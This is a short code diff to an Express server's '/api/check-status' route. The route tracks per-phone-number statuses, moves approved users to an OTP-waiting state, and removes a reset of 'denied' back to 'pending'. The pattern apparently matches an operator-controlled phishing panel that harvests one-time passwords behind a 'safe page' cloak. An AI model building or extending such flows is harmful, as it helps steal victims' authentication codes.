@@ -411,11 +411,6 @@ app.get('/api/check-status', (req, res) => {
     if (currentStatus === "approved") {
         statusStore[phone] = "idle_waiting_for_otp1";
     }
-    
-    // ADDED: Reset denied status back to pending after sending it to page 6
-    if (currentStatus === "denied") {
-        statusStore[phone] = "pending";
-    }
 });
 
 // -------------------- SAFE PAGE ROUTE --------------------
